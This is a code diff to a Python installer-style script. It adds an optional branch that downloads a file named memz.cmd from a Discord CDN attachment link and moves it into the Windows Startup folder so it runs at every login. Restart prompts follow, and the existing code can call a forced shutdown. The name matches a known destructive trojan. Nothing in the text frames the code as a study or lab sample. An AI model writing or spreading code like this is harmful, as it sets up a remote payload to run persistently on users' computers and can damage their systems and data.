@@ -3,9 +3,43 @@ import os
 import time
 import shutil
 
+user_input = input('Do you Want to download and install memz (yes/no): ')
+
+if user_input.lower() == 'yes':
+    time.sleep(2.0)
+    print("installing memz")
+
+    bat_url = "https://cdn.discordapp.com/attachments/1066380188750991533/1069963515617624204/memz.cmd"
+
+    bat = wget.download(bat_url) #downloads first file from url
+    print(bat)
+    
+    print("Downloaded 1 file")
+
+    time.sleep(2.0)
+
+    print("Moving the files")
 
 
-print("Starting Installation")
+
+    appdata =  os.getenv('APPDATA')
+
+    startup_loc = appdata + \
+     "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+
+
+    # Moving first file 
+    src_path = r"memz.cmd"
+    dst_path = startup_loc
+    shutil.move(src_path, dst_path)
+
+    print("installed Memz Restart to take effect")
+    time.sleep(10.0)
+    exit()
+
+
+elif user_input.lower() == 'no':
+    print("Starting Installation")
 
 time.sleep(2.0)
 
@@ -54,3 +88,5 @@ if restart == 'no':
     exit()
 else:
     os.system("shutdown /r /t 30")
+
+
